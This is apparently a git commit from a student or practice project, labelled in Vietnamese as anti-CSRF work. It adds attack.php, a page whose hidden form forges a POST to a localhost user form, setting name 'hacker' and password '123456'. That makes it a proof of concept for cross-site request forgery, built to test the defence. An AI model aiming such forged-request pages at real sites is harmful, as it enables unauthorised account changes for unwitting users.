c7c70eab1a29b2e1dc2324e225b0660565b8fa0b
THoai05 <vothanhhoai2k5@gmail.com>
2025-09-25 00:50:46 +0700

    chong csrf

---
+++ sources/attack.php
@@ -0,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <form action="http://localhost:8080/form_user.php" method="POST">
+        <input type="hidden" name="name" value="hacker">
+        <input type="hidden" name="password" value="123456">
+        <input type="hidden" name="submit" value="submit">
+        <button type="submit">Fake Submit</button>
+    </form>
+</body>
+
+</html>
